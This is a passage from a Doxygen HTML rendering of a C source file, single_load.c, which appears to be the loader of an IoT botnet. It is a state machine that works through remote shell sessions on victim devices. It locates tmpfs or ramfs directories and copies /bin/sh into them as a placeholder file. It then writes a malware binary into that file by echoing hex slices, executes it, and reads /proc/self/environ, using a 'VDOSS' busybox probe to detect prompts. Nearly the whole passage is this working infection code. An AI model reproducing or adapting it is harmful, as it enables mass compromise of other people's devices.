class="keywordtype">char</span> *space = NULL;</div><div class="line"><a name="l00529"></a><span class="lineno">  529</span>&#160;                            <span class="keywordtype">int</span> memes = 0;</div><div class="line"><a name="l00530"></a><span class="lineno">  530</span>&#160;                            <span class="keywordflow">do</span></div><div class="line"><a name="l00531"></a><span class="lineno">  531</span>&#160;                            {</div><div class="line"><a name="l00532"></a><span class="lineno">  532</span>&#160;                                start = strstr(tmp_buf, <span class="stringliteral">&quot;tmpfs&quot;</span>) != NULL ? strstr(tmp_buf, <span class="stringliteral">&quot;tmpfs&quot;</span>) : strstr(tmp_buf, <span class="stringliteral">&quot;ramfs&quot;</span>);</div><div class="line"><a name="l00533"></a><span class="lineno">  533</span>&#160;                                space = strchr(start, <span class="charliteral">&#39; &#39;</span>);</div><div class="line"><a name="l00534"></a><span class="lineno">  534</span>&#160;                                <span class="keywordflow">if</span> (start != tmp_buf &amp;&amp; *(start - 1) != <span class="charliteral">&#39;\n&#39;</span>)</div><div class="line"><a name="l00535"></a><span class="lineno">  535</span>&#160;                                {</div><div class="line"><a name="l00536"></a><span class="lineno">  536</span>&#160;                                    <span class="comment">//this is a middle of line find</span></div><div class="line"><a name="l00537"></a><span class="lineno">  537</span>&#160;                                    <span class="keywordflow">while</span>(start &gt; buf &amp;&amp; *start != <span class="charliteral">&#39;\n&#39;</span>) start--;</div><div class="line"><a name="l00538"></a><span class="lineno">  538</span>&#160;                                    </div><div class="line"><a name="l00539"></a><span class="lineno">  539</span>&#160;                                    <span class="comment">//WEVE GONE TOO FAR GOTTA BLAST</span></div><div class="line"><a name="l00540"></a><span class="lineno">  540</span>&#160;                                    <span class="keywordflow">if</span> (start == buf)</div><div class="line"><a name="l00541"></a><span class="lineno">  541</span>&#160;                                        <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00542"></a><span class="lineno">  542</span>&#160;                                    </div><div class="line"><a name="l00543"></a><span class="lineno">  543</span>&#160;                                    start++;</div><div class="line"><a name="l00544"></a><span class="lineno">  544</span>&#160;                                    space = strchr(start, <span class="charliteral">&#39; &#39;</span>);</div><div class="line"><a name="l00545"></a><span class="lineno">  545</span>&#160;                                }</div><div class="line"><a name="l00546"></a><span class="lineno">  546</span>&#160;                                </div><div class="line"><a name="l00547"></a><span class="lineno">  547</span>&#160;                                <span class="keywordflow">if</span> (space[1] == <span class="charliteral">&#39;/&#39;</span>)</div><div class="line"><a name="l00548"></a><span class="lineno">  548</span>&#160;                                {</div><div class="line"><a name="l00549"></a><span class="lineno">  549</span>&#160;                                    <span class="keywordtype">int</span> iii = 1;</div><div class="line"><a name="l00550"></a><span class="lineno">  550</span>&#160;</div><div class="line"><a name="l00551"></a><span class="lineno">  551</span>&#160;                                    <span class="keywordflow">for</span> (iii = 1; ; iii++) {</div><div class="line"><a name="l00552"></a><span class="lineno">  552</span>&#160;                                        <span class="keywordflow">if</span> (space[iii] == <span class="charliteral">&#39;\0&#39;</span> || space[iii] == <span class="charliteral">&#39; &#39;</span>) {</div><div class="line"><a name="l00553"></a><span class="lineno">  553</span>&#160;                                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00554"></a><span class="lineno">  554</span>&#160;                                        }</div><div class="line"><a name="l00555"></a><span class="lineno">  555</span>&#160;                                    }</div><div class="line"><a name="l00556"></a><span class="lineno">  556</span>&#160;                                    </div><div class="line"><a name="l00557"></a><span class="lineno">  557</span>&#160;                                    <span class="keywordflow">if</span> (iii &gt; 1) {</div><div class="line"><a name="l00558"></a><span class="lineno">  558</span>&#160;                                        strncpy(state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[memes], &amp;space[1], iii - 1);</div><div class="line"><a name="l00559"></a><span class="lineno">  559</span>&#160;                                        state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[memes][iii - 1] = <span class="charliteral">&#39;\0&#39;</span>;</div><div class="line"><a name="l00560"></a><span class="lineno">  560</span>&#160;                                        memes++;</div><div class="line"><a name="l00561"></a><span class="lineno">  561</span>&#160;                                    }</div><div class="line"><a name="l00562"></a><span class="lineno">  562</span>&#160;                                    </div><div class="line"><a name="l00563"></a><span class="lineno">  563</span>&#160;                                    space = space + iii; </div><div class="line"><a name="l00564"></a><span class="lineno">  564</span>&#160;                                    <span class="keywordflow">if</span> (space[0] != <span class="charliteral">&#39;\0&#39;</span>)</div><div class="line"><a name="l00565"></a><span class="lineno">  565</span>&#160;                                    {</div><div class="line"><a name="l00566"></a><span class="lineno">  566</span>&#160;                                        <span class="keywordflow">for</span> (iii = 1; ; iii++) {</div><div class="line"><a name="l00567"></a><span class="lineno">  567</span>&#160;                                            <span class="keywordflow">if</span> (space[iii] == <span class="charliteral">&#39;\0&#39;</span> || space[iii] == <span class="charliteral">&#39; &#39;</span>) {</div><div class="line"><a name="l00568"></a><span class="lineno">  568</span>&#160;                                                <span class="keywordflow">break</span>;</div><div class="line"><a name="l00569"></a><span class="lineno">  569</span>&#160;                                            }</div><div class="line"><a name="l00570"></a><span class="lineno">  570</span>&#160;                                        }</div><div class="line"><a name="l00571"></a><span class="lineno">  571</span>&#160;                                        space = space + iii;</div><div class="line"><a name="l00572"></a><span class="lineno">  572</span>&#160;                                    } <span class="keywordflow">else</span> {</div><div class="line"><a name="l00573"></a><span class="lineno">  573</span>&#160;                                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00574"></a><span class="lineno">  574</span>&#160;                                    }</div><div class="line"><a name="l00575"></a><span class="lineno">  575</span>&#160;                                }</div><div class="line"><a name="l00576"></a><span class="lineno">  576</span>&#160;                                </div><div class="line"><a name="l00577"></a><span class="lineno">  577</span>&#160;                                tmp_buf = space;</div><div class="line"><a name="l00578"></a><span class="lineno">  578</span>&#160;                            } <span class="keywordflow">while</span>(strstr(tmp_buf, <span class="stringliteral">&quot;tmpfs&quot;</span>) != NULL || strstr(tmp_buf, <span class="stringliteral">&quot;ramfs&quot;</span>) != NULL &amp;&amp; memes &lt; 5);</div><div class="line"><a name="l00579"></a><span class="lineno">  579</span>&#160;                            </div><div class="line"><a name="l00580"></a><span class="lineno">  580</span>&#160;                            <span class="keywordflow">if</span> (strlen(state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[0]) == 0)</div><div class="line"><a name="l00581"></a><span class="lineno">  581</span>&#160;                            {</div><div class="line"><a name="l00582"></a><span class="lineno">  582</span>&#160;                                strcpy(state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[0], <span class="stringliteral">&quot;/&quot;</span>);</div><div class="line"><a name="l00583"></a><span class="lineno">  583</span>&#160;                            }</div><div class="line"><a name="l00584"></a><span class="lineno">  584</span>&#160;                            </div><div class="line"><a name="l00585"></a><span class="lineno">  585</span>&#160;                            <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a &amp;&amp; /bin/busybox VDOSS\r\n&quot;</span>, state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[0], state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[0], state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[0]);</div><div class="line"><a name="l00586"></a><span class="lineno">  586</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 100;</div><div class="line"><a name="l00587"></a><span class="lineno">  587</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00588"></a><span class="lineno">  588</span>&#160;                        } <span class="keywordflow">else</span> <span class="keywordflow">if</span> (<a class="code" href="single__load_8c.html#af5f21519b5c3a467090f9d34153880ed">matchPrompt</a>(buf))</div><div class="line"><a name="l00589"></a><span class="lineno">  589</span>&#160;                        {</div><div class="line"><a name="l00590"></a><span class="lineno">  590</span>&#160;                            strcpy(state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[0], <span class="stringliteral">&quot;/var/run&quot;</span>);</div><div class="line"><a name="l00591"></a><span class="lineno">  591</span>&#160;                            <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a &amp;&amp; /bin/busybox VDOSS\r\n&quot;</span>, state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[0], state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[0], state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[0]);</div><div class="line"><a name="l00592"></a><span class="lineno">  592</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 100;</div><div class="line"><a name="l00593"></a><span class="lineno">  593</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00594"></a><span class="lineno">  594</span>&#160;                        }</div><div class="line"><a name="l00595"></a><span class="lineno">  595</span>&#160;                    }</div><div class="line"><a name="l00596"></a><span class="lineno">  596</span>&#160;                }</div><div class="line"><a name="l00597"></a><span class="lineno">  597</span>&#160;                </div><div class="line"><a name="l00598"></a><span class="lineno">  598</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 100)</div><div class="line"><a name="l00599"></a><span class="lineno">  599</span>&#160;                {</div><div class="line"><a name="l00600"></a><span class="lineno">  600</span>&#160;                    <span class="keywordflow">while</span> ((got = <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 10240, 0)) &gt; 0)</div><div class="line"><a name="l00601"></a><span class="lineno">  601</span>&#160;                    {</div><div class="line"><a name="l00602"></a><span class="lineno">  602</span>&#160;                        <span class="keywordflow">if</span> (strcasestr(buf, <span class="stringliteral">&quot;applet not found&quot;</span>) != NULL)</div><div class="line"><a name="l00603"></a><span class="lineno">  603</span>&#160;                        {</div><div class="line"><a name="l00604"></a><span class="lineno">  604</span>&#160;                            <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;/bin/busybox echo -ne &#39;&#39; &gt; %s/a &amp;&amp; /bin/busybox VDOSS\r\n&quot;</span>, state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[state-&gt;<a class="code" href="structstateSlot__t.html#ab4d619ac04c7c52d3acc5872d8e46d18">pathInd</a>]);</div><div class="line"><a name="l00605"></a><span class="lineno">  605</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 101;</div><div class="line"><a name="l00606"></a><span class="lineno">  606</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00607"></a><span class="lineno">  607</span>&#160;                        } <span class="keywordflow">else</span> <span class="keywordflow">if</span> (<a class="code" href="single__load_8c.html#af5f21519b5c3a467090f9d34153880ed">matchPrompt</a>(buf))</div><div class="line"><a name="l00608"></a><span class="lineno">  608</span>&#160;                        {</div><div class="line"><a name="l00609"></a><span class="lineno">  609</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#ab4d619ac04c7c52d3acc5872d8e46d18">pathInd</a>++;</div><div class="line"><a name="l00610"></a><span class="lineno">  610</span>&#160;                            <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#ab4d619ac04c7c52d3acc5872d8e46d18">pathInd</a> == 5 || strlen(state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[state-&gt;<a class="code" href="structstateSlot__t.html#ab4d619ac04c7c52d3acc5872d8e46d18">pathInd</a>]) == 0)</div><div class="line"><a name="l00611"></a><span class="lineno">  611</span>&#160;                            {</div><div class="line"><a name="l00612"></a><span class="lineno">  612</span>&#160;                                strcpy(state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[0], <span class="stringliteral">&quot;/var/run&quot;</span>);</div><div class="line"><a name="l00613"></a><span class="lineno">  613</span>&#160;                                state-&gt;<a class="code" href="structstateSlot__t.html#ab4d619ac04c7c52d3acc5872d8e46d18">pathInd</a> = 0;</div><div class="line"><a name="l00614"></a><span class="lineno">  614</span>&#160;                                <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;/bin/busybox echo -ne &#39;&#39; &gt; %s/a &amp;&amp; /bin/busybox VDOSS\r\n&quot;</span>, state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[state-&gt;<a class="code" href="structstateSlot__t.html#ab4d619ac04c7c52d3acc5872d8e46d18">pathInd</a>]);</div><div class="line"><a name="l00615"></a><span class="lineno">  615</span>&#160;                                state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 101;</div><div class="line"><a name="l00616"></a><span class="lineno">  616</span>&#160;                                <span class="keywordflow">break</span>;</div><div class="line"><a name="l00617"></a><span class="lineno">  617</span>&#160;                            }</div><div class="line"><a name="l00618"></a><span class="lineno">  618</span>&#160;                            <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a &amp;&amp; /bin/busybox VDOSS\r\n&quot;</span>, state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[state-&gt;<a class="code" href="structstateSlot__t.html#ab4d619ac04c7c52d3acc5872d8e46d18">pathInd</a>], state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[state-&gt;<a class="code" href="structstateSlot__t.html#ab4d619ac04c7c52d3acc5872d8e46d18">pathInd</a>], state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[state-&gt;<a class="code" href="structstateSlot__t.html#ab4d619ac04c7c52d3acc5872d8e46d18">pathInd</a>]);</div><div class="line"><a name="l00619"></a><span class="lineno">  619</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00620"></a><span class="lineno">  620</span>&#160;                        }</div><div class="line"><a name="l00621"></a><span class="lineno">  621</span>&#160;                    }</div><div class="line"><a name="l00622"></a><span class="lineno">  622</span>&#160;                }</div><div class="line"><a name="l00623"></a><span class="lineno">  623</span>&#160;                </div><div class="line"><a name="l00624"></a><span class="lineno">  624</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 101)</div><div class="line"><a name="l00625"></a><span class="lineno">  625</span>&#160;                {</div><div class="line"><a name="l00626"></a><span class="lineno">  626</span>&#160;                    <span class="keywordflow">while</span> ((got = <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 10240, 0)) &gt; 0)</div><div class="line"><a name="l00627"></a><span class="lineno">  627</span>&#160;                    {</div><div class="line"><a name="l00628"></a><span class="lineno">  628</span>&#160;                        <span class="keywordflow">if</span> (strcasestr(buf, <span class="stringliteral">&quot;applet not found&quot;</span>) != NULL)</div><div class="line"><a name="l00629"></a><span class="lineno">  629</span>&#160;                        {</div><div class="line"><a name="l00630"></a><span class="lineno">  630</span>&#160;                            <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;/bin/busybox echo -ne %s &gt;&gt; %s/a &amp;&amp; /bin/busybox VDOSS\r\n&quot;</span>, <a class="code" href="structbinary.html">binary</a>.slices[state-&gt;<a class="code" href="structstateSlot__t.html#a721d0ad3dabe6a8ab733633dac0b6d8c">echoInd</a>++], state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[state-&gt;<a class="code" href="structstateSlot__t.html#ab4d619ac04c7c52d3acc5872d8e46d18">pathInd</a>]);</div><div class="line"><a name="l00631"></a><span class="lineno">  631</span>&#160;                            <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a721d0ad3dabe6a8ab733633dac0b6d8c">echoInd</a> == <a class="code" href="structbinary.html">binary</a>.num_slices) state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 102;</div><div class="line"><a name="l00632"></a><span class="lineno">  632</span>&#160;                            <span class="keywordflow">else</span> state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 101;</div><div class="line"><a name="l00633"></a><span class="lineno">  633</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00634"></a><span class="lineno">  634</span>&#160;                        }</div><div class="line"><a name="l00635"></a><span class="lineno">  635</span>&#160;                    }</div><div class="line"><a name="l00636"></a><span class="lineno">  636</span>&#160;                }</div><div class="line"><a name="l00637"></a><span class="lineno">  637</span>&#160;                </div><div class="line"><a name="l00638"></a><span class="lineno">  638</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 102)</div><div class="line"><a name="l00639"></a><span class="lineno">  639</span>&#160;                {</div><div class="line"><a name="l00640"></a><span class="lineno">  640</span>&#160;                    <span class="keywordflow">while</span> ((got = <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 10240, 0)) &gt; 0)</div><div class="line"><a name="l00641"></a><span class="lineno">  641</span>&#160;                    {</div><div class="line"><a name="l00642"></a><span class="lineno">  642</span>&#160;                        <span class="keywordflow">if</span> (strcasestr(buf, <span class="stringliteral">&quot;applet not found&quot;</span>) != NULL)</div><div class="line"><a name="l00643"></a><span class="lineno">  643</span>&#160;                        {</div><div class="line"><a name="l00644"></a><span class="lineno">  644</span>&#160;                            <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;%s/a %s; /bin/busybox VDOSS\r\n&quot;</span>, state-&gt;<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[state-&gt;<a class="code" href="structstateSlot__t.html#ab4d619ac04c7c52d3acc5872d8e46d18">pathInd</a>], <a class="code" href="single__load_8c.html#a3ade46bb9591205f4fa0b1daf0641f84">run_arg</a>);</div><div class="line"><a name="l00645"></a><span class="lineno">  645</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 103;</div><div class="line"><a name="l00646"></a><span class="lineno">  646</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00647"></a><span class="lineno">  647</span>&#160;                        }</div><div class="line"><a name="l00648"></a><span class="lineno">  648</span>&#160;                    }</div><div class="line"><a name="l00649"></a><span class="lineno">  649</span>&#160;                }</div><div class="line"><a name="l00650"></a><span class="lineno">  650</span>&#160;                </div><div class="line"><a name="l00651"></a><span class="lineno">  651</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 103)</div><div class="line"><a name="l00652"></a><span class="lineno">  652</span>&#160;                {</div><div class="line"><a name="l00653"></a><span class="lineno">  653</span>&#160;                    <span class="keywordflow">while</span> ((got = <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 10240, 0)) &gt; 0)</div><div class="line"><a name="l00654"></a><span class="lineno">  654</span>&#160;                    {</div><div class="line"><a name="l00655"></a><span class="lineno">  655</span>&#160;                        <span class="keywordflow">if</span> (strcasestr(buf, <span class="stringliteral">&quot;applet not found&quot;</span>) != NULL)</div><div class="line"><a name="l00656"></a><span class="lineno">  656</span>&#160;                        {</div><div class="line"><a name="l00657"></a><span class="lineno">  657</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 255;</div><div class="line"><a name="l00658"></a><span class="lineno">  658</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00659"></a><span class="lineno">  659</span>&#160;                        }</div><div class="line"><a name="l00660"></a><span class="lineno">  660</span>&#160;                    }</div><div class="line"><a name="l00661"></a><span class="lineno">  661</span>&#160;                }</div><div class="line"><a name="l00662"></a><span class="lineno">  662</span>&#160;                </div><div class="line"><a name="l00663"></a><span class="lineno">  663</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 250)</div><div class="line"><a name="l00664"></a><span class="lineno">  664</span>&#160;                {</div><div class="line"><a name="l00665"></a><span class="lineno">  665</span>&#160;                    <span class="keywordflow">while</span> ((got = <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 10240, 0)) &gt; 0)</div><div class="line"><a name="l00666"></a><span class="lineno">  666</span>&#160;                    {</div><div class="line"><a name="l00667"></a><span class="lineno">  667</span>&#160;                        <span class="keywordflow">if</span> (<a class="code" href="single__load_8c.html#af5f21519b5c3a467090f9d34153880ed">matchPrompt</a>(buf))</div><div class="line"><a name="l00668"></a><span class="lineno">  668</span>&#160;                        {</div><div class="line"><a name="l00669"></a><span class="lineno">  669</span>&#160;                            <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;show text /proc/self/environ\r\n&quot;</span>);</div><div class="line"><a name="l00670"></a><span class="lineno">  670</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 251;</div><div class="line"><a name="l00671"></a><span class="lineno">  671</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00672"></a><span class="lineno">  672</span>&#160;                        }</div><div class="line"><a name="l00673"></a><span class="lineno">  673</span>&#160;                    }</div><div class="line"><a name="l00674"></a><span class="lineno">  674</span>&#160;                }</div><div class="line"><a name="l00675"></a><span class="lineno">  675</span>&#160;                </div><div class="line"><a name="l00676"></a><span class="lineno">  676</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 251)</div><div class="line"><a name="l00677"></a><span class="lineno">  677</span>&#160;                {</div><div class="line"><a name="l00678"></a><span class="lineno">  678</span>&#160;                    <span class="keywordflow">while</span> ((got = <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 10240, 0)) &gt; 0)</div><div class="line"><a name="l00679"></a><span class="lineno">  679</span>&#160;                    {</div><div class="line"><a name="l00680"></a><span class="lineno">  680</span>&#160;                        <span class="keywordflow">if</span> (<a class="code" href="single__load_8c.html#a46a5c759285caddc5c5a39aee3b2c48d">memmem</a>(buf, got, <span class="stringliteral">&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;</span>, 16) != NULL || <a class="code" href="single__load_8c.html#af5f21519b5c3a467090f9d34153880ed">matchPrompt</a>(buf))</div><div class="line"><a name="l00681"></a><span class="lineno">  681</span>&#160;                        {</div><div class="line"><a name="l00682"></a><span class="lineno">  682</span>&#160;                            <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;export PS1=\&quot;prompt&gt;\&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00683"></a><span class="lineno">  683</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 8;</div><div class="line"><a name="l00684"></a><span class="lineno">  684</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00685"></a><span class="lineno">  685</span>&#160;                        }</div><div class="line"><a name="l00686"></a><span class="lineno">  686</span>&#160;                    }</div><div class="line"><a name="l00687"></a><span class="lineno">  687</span>&#160;                }</div><div class="line"><a name="l00688"></a><span class="lineno">  688</span>&#160;                </div><div class="line"><a name="l00689"></a><span class="lineno">  689</span>&#160;                <span class="comment">//reconnect and retry</span></div><div class="line"><a name="l00690"></a><span class="lineno">  690</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 254)</div><div class="line"><a name="l00691"></a><span class="lineno">  691</span>&#160;                {</div><div class="line"><a name="l00692"></a><span class="lineno">  692</span>&#160;                    <a class="code" href="single__load_8c.html#ab5a5480e7ca5603df2e3fb59300b966a">closeAndCleanup</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>); </div><div class="line"><a name="l00693"></a><span class="lineno">  693</span>&#160;                    is_closed = 1;</div><div class="line"><a name="l00694"></a><span class="lineno">  694</span>&#160;                }</div><div class="line"><a name="l00695"></a><span class="lineno">  695</span>&#160;                </div><div class="line"><a name="l00696"></a><span class="lineno">  696</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 255)</div><div class="line"><a name="l00697"></a><span class="lineno">  697</span>&#160;                {</div><div class="line"><a name="l00698"></a><span class="lineno">  698</span>&#160;                    <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a0a912afe1412b83a1a360e2e366cb49f">success</a>)</div><div class="line"><a name="l00699"></a><span class="lineno">  699</span>&#160;                    {</div><div class="line"><a name="l00700"></a><span class="lineno">  700</span>&#160;                        <a class="code" href="single__load_8c.html#a3b804bc1e71e873697dea65f8bd95523">handle_found</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>);</div><div class="line"><a name="l00701"></a><span class="lineno">  701</span>&#160;                    }</div><div class="line"><a name="l00702"></a><span class="lineno">  702</span>&#160;                    <a class="code" href="single__load_8c.html#ab5a5480e7ca5603df2e3fb59300b966a">closeAndCleanup</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>); </div><div class="line"><a name="l00703"></a><span class="lineno">  703</span>&#160;                    is_closed = 1;</div><div class="line"><a name="l00704"></a><span class="lineno">  704</span>&#160;                }</div><div class="line"><a name="l00705"></a><span class="lineno">  705</span>&#160;                </div><div class="line"><a name="l00706"></a><span class="lineno">  706</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#ad56d8a19fb1b26615b1a1da138685b90">slotUsed</a> &amp;&amp; (old_state != state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> || state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 101))</div><div class="line"><a name="l00707"></a><span class="lineno">  707</span>&#160;                    <a class="code" href="single__load_8c.html#afdc29b4b6b64963d88e1b69fd47a73d3">updateAccessTime</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>);</div><div class="line"><a name="l00708"></a><span class="lineno">  708</span>&#160;                </div><div class="line"><a name="l00709"></a><span class="lineno">  